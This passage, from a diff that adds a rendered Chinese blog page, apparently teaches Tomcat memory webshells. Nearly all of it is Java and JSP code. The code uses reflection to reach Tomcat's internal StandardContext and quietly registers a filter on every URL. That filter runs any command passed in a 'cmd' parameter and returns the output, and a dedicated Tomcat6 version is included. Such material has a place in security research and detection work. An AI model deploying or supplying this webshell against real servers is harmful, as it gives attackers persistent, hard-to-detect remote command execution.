+                    <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">().</span><span class="na">read</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
+                    <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">len</span><span class="o">));</span>
+                    <span class="n">process</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span>
+                    <span class="k">return</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="nd">@Override</span>
+            <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+
+            <span class="o">}</span>
+
+        <span class="o">};</span>
+        <span class="c1">//添加filter到filterDef
+</span><span class="c1"></span>        <span class="n">FilterDef</span> <span class="n">filterDef</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterDef</span><span class="o">();</span>
+        <span class="n">filterDef</span><span class="o">.</span><span class="na">setFilter</span><span class="o">(</span><span class="n">filter</span><span class="o">);</span>
+        <span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+        <span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterClass</span><span class="o">(</span><span class="n">filter</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
+        <span class="c1">//添加filterDef到filterDefs中
+</span><span class="c1"></span>        <span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterDef</span><span class="o">(</span><span class="n">filterDef</span><span class="o">);</span>
+        <span class="c1">//创建FilterMap
+</span><span class="c1"></span>        <span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterMap</span><span class="o">();</span>
+        <span class="n">filterMap</span><span class="o">.</span><span class="na">addURLPattern</span><span class="o">(</span><span class="s">&#34;/*&#34;</span><span class="o">);</span>
+        <span class="n">filterMap</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+        <span class="n">filterMap</span><span class="o">.</span><span class="na">setDispatcher</span><span class="o">(</span><span class="n">DispatcherType</span><span class="o">.</span><span class="na">REQUEST</span><span class="o">.</span><span class="na">name</span><span class="o">());</span>
+        <span class="c1">//将该FilterMap添加到最前面
+</span><span class="c1"></span>        <span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterMapBefore</span><span class="o">(</span><span class="n">filterMap</span><span class="o">);</span>
+        <span class="c1">//创建ApplicationFilterConfig类, 并将它添加到filterConfigs中
+</span><span class="c1"></span>        <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">ApplicationFilterConfig</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">FilterDef</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">standardContext</span><span class="o">,</span> <span class="n">filterDef</span><span class="o">);</span>
+        <span class="n">filterConfigs</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">filterConfig</span><span class="o">);</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">&#34;Success!&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">%&gt;</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><h3 id="tomcat6-实现"><a href="#tomcat6-实现" class="anchor-link">#</a><a href="#contents:tomcat6-实现" class="headings">Tomcat6 实现</a></h3>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.demo</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.servlet.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServlet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletRequest</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.HttpServletResponse</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.PrintWriter</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Iterator</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">org.apache.catalina.Context</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.core.ApplicationFilterConfig</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.core.StandardContext</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.core.StandardEngine</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.core.StandardHost</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.deploy.FilterDef</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.catalina.deploy.FilterMap</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">goodServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
+            <span class="n">Tomcat6789</span> <span class="n">a</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Tomcat6789</span><span class="o">();</span>
+            <span class="n">StandardContext</span> <span class="n">standardContext</span><span class="o">=</span><span class="n">a</span><span class="o">.</span><span class="na">getSTC</span><span class="o">();</span>
+            <span class="n">Field</span> <span class="n">Configs</span> <span class="o">=</span> <span class="n">standardContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;filterConfigs&#34;</span><span class="o">);</span>
+            <span class="n">Configs</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Map</span> <span class="n">filterConfigs</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Configs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">standardContext</span><span class="o">);</span>
+            <span class="kd">final</span> <span class="n">String</span> <span class="n">name</span><span class="o">=</span><span class="s">&#34;idoaiod&#34;</span><span class="o">;</span>
+            <span class="k">if</span><span class="o">(</span><span class="n">filterConfigs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">name</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">Filter</span> <span class="n">filter</span> <span class="o">=</span> <span class="k">new</span> <span class="n">myfilter</span><span class="o">();</span>
+                <span class="n">FilterDef</span> <span class="n">filterDef</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterDef</span><span class="o">();</span>
+                <span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+                <span class="n">filterDef</span><span class="o">.</span><span class="na">setFilterClass</span><span class="o">(</span><span class="n">filter</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">());</span>
+                <span class="c1">//添加filterDef到filterDefs中
+</span><span class="c1"></span>                <span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterDef</span><span class="o">(</span><span class="n">filterDef</span><span class="o">);</span>
+                <span class="c1">//创建FilterMap
+</span><span class="c1"></span>                <span class="n">FilterMap</span> <span class="n">filterMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FilterMap</span><span class="o">();</span>
+                <span class="n">filterMap</span><span class="o">.</span><span class="na">addURLPattern</span><span class="o">(</span><span class="s">&#34;/*&#34;</span><span class="o">);</span>
+                <span class="n">filterMap</span><span class="o">.</span><span class="na">setFilterName</span><span class="o">(</span><span class="n">name</span><span class="o">);</span>
+                <span class="n">standardContext</span><span class="o">.</span><span class="na">addFilterMap</span><span class="o">(</span><span class="n">filterMap</span><span class="o">);</span>
+                <span class="c1">//创建ApplicationFilterConfig类, 并将它添加到filterConfigs中
+</span><span class="c1"></span>                <span class="n">Constructor</span> <span class="n">constructor</span> <span class="o">=</span> <span class="n">ApplicationFilterConfig</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">FilterDef</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+                <span class="n">constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">ApplicationFilterConfig</span> <span class="n">filterConfig</span> <span class="o">=</span> <span class="o">(</span><span class="n">ApplicationFilterConfig</span><span class="o">)</span> <span class="n">constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">standardContext</span><span class="o">,</span> <span class="n">filterDef</span><span class="o">);</span>
+                <span class="n">filterConfigs</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">filterConfig</span><span class="o">);</span>
+                
+                <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;injected&#34;</span><span class="o">);</span>
+            <span class="o">}</span>
+
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+    <span class="kd">static</span> <span class="kd">public</span> <span class="kd">class</span> <span class="nc">myfilter</span> <span class="kd">implements</span> <span class="n">Filter</span> <span class="o">{</span>
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">(</span><span class="n">FilterConfig</span> <span class="n">filterConfig</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span> <span class="o">{</span>
+
+        <span class="o">}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doFilter</span><span class="o">(</span><span class="n">ServletRequest</span> <span class="n">servletRequest</span><span class="o">,</span> <span class="n">ServletResponse</span> <span class="n">servletResponse</span><span class="o">,</span> <span class="n">FilterChain</span> <span class="n">filterChain</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span> <span class="o">{</span>
+            <span class="n">HttpServletRequest</span> <span class="n">req</span> <span class="o">=</span> <span class="o">(</span><span class="n">HttpServletRequest</span><span class="o">)</span> <span class="n">servletRequest</span><span class="o">;</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">1024</span><span class="o">];</span>
+                <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">)).</span><span class="na">start</span><span class="o">();</span>
+                <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">process</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">().</span><span class="na">read</span><span class="o">(</span><span class="n">bytes</span><span class="o">);</span>
+                <span class="n">servletResponse</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">write</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">len</span><span class="o">));</span>
+                <span class="n">process</span><span class="o">.</span><span class="na">destroy</span><span class="o">();</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="n">filterChain</span><span class="o">.</span><span class="na">doFilter</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">,</span> <span class="n">servletResponse</span><span class="o">);</span>
+        <span class="o">}</span>
+
+        <span class="nd">@Override</span>
+        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">destroy</span><span class="o">()</span> <span class="o">{</span>
+
+        <span class="o">}</span>
+
+    <span class="o">}</span>
+    <span class="kd">class</span> <span class="nc">Tomcat6789</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">uri</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">serverName</span><span class="o">;</span>
+        <span class="n">StandardContext</span> <span class="n">standardContext</span><span class="o">;</span>
+
+        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getField</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Field</span> <span class="n">declaredField</span><span class="o">;</span>
+            <span class="n">Class</span> <span class="n">clazz</span> <span class="o">=</span> <span class="n">object</span><span class="o">.</span><span class="na">getClass</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">try</span> <span class="o">{</span>
+
+                    <span class="n">declaredField</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+                    <span class="n">declaredField</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                    <span class="k">return</span> <span class="n">declaredField</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">object</span><span class="o">);</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="o">}</span>
+                <span class="n">clazz</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="n">Object</span> <span class="nf">GetAcceptorThread</span><span class="o">()</span> <span class="o">{</span>
+            <span class="c1">//获取当前所有线程
+</span><span class="c1"></span>            <span class="n">Thread</span><span class="o">[]</span> <span class="n">threads</span> <span class="o">=</span> <span class="o">(</span><span class="n">Thread</span><span class="o">[])</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getThreadGroup</span><span class="o">(),</span> <span class="s">&#34;threads&#34;</span><span class="o">);</span>
+            <span class="c1">//从线程组中找到Acceptor所在的线程 在tomcat6中的格式为:Http-端口-Acceptor
+</span><span class="c1"></span>            <span class="k">for</span> <span class="o">(</span><span class="n">Thread</span> <span class="n">thread</span> <span class="o">:</span> <span class="n">threads</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">thread</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;exec&#34;</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="k">if</span> <span class="o">((</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;Acceptor&#34;</span><span class="o">))</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">thread</span><span class="o">.</span><span class="na">getName</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;http&#34;</span><span class="o">)))</span> <span class="o">{</span>
+                    <span class="n">Object</span> <span class="n">target</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;target&#34;</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(!(</span><span class="n">target</span> <span class="k">instanceof</span> <span class="n">Runnable</span><span class="o">))</span> <span class="o">{</span>
+                        <span class="k">try</span> <span class="o">{</span>
+                            <span class="n">Object</span> <span class="n">target2</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getField</span><span class="o">(</span><span class="n">thread</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                            <span class="n">target</span> <span class="o">=</span> <span class="n">thread</span><span class="o">;</span>
+                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                            <span class="k">continue</span><span class="o">;</span>
+                        <span class="o">}</span>
+                    <span class="o">}</span>
+                    <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;this$0&#34;</span><span class="o">);</span>
+                    <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                        <span class="k">try</span> <span class="o">{</span>
+                            <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">target</span><span class="o">,</span> <span class="s">&#34;endpoint&#34;</span><span class="o">);</span>
+                        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                            <span class="k">continue</span><span class="o">;</span>
+                        <span class="o">}</span>
+                    <span class="o">}</span>
+                    <span class="k">return</span> <span class="n">jioEndPoint</span><span class="o">;</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}</span>
+
+        <span class="kd">public</span> <span class="nf">Tomcat6789</span><span class="o">()</span> <span class="o">{</span>
+            <span class="n">Object</span> <span class="n">jioEndPoint</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">GetAcceptorThread</span><span class="o">();</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">jioEndPoint</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span><span class="o">;</span>
+            <span class="o">}</span>
+            <span class="n">Object</span> <span class="n">object</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">getField</span><span class="o">(</span><span class="n">jioEndPoint</span><span class="o">,</span> <span class="s">&#34;handler&#34;</span><span class="o">),</span> <span class="s">&#34;global&#34;</span><span class="o">);</span>
+            <span class="c1">//从找到的Acceptor线程中获取请求域名、请求的路径
+</span><span class="c1"></span>            <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span> <span class="n">processors</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">object</span><span class="o">,</span> <span class="s">&#34;processors&#34;</span><span class="o">);</span>
+            <span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">processors</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
+            <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
+                <span class="n">Object</span> <span class="n">next</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
+                <span class="n">Object</span> <span class="n">req</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">next</span><span class="o">,</span> <span class="s">&#34;req&#34;</span><span class="o">);</span>
+                <span class="n">Object</span> <span class="n">serverPort</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">&#34;serverPort&#34;</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">serverPort</span><span class="o">.</span><span class="na">equals</span><span class="o">(-</span><span class="n">1</span><span class="o">))</span> <span class="o">{</span>
+                    <span class="k">continue</span><span class="o">;</span>
+                <span class="o">}</span>
+                <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">buf</span><span class="o">.</span><span class="na">MessageBytes</span> <span class="n">serverNameMB</span> <span class="o">=</span> <span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">tomcat</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">buf</span><span class="o">.</span><span class="na">MessageBytes</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">req</span><span class="o">,</span> <span class="s">&#34;serverNameMB&#34;</span><span class="o">);</span>
+                <span class="k">this</span><span class="o">.</span><span class="na">serverName</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">getField</span><span class="o">(</span><span class="n">serverNameMB</span><span class="o">,</span> <span class="s">&#34;strValue&#34;</span><span class="o">);</span>
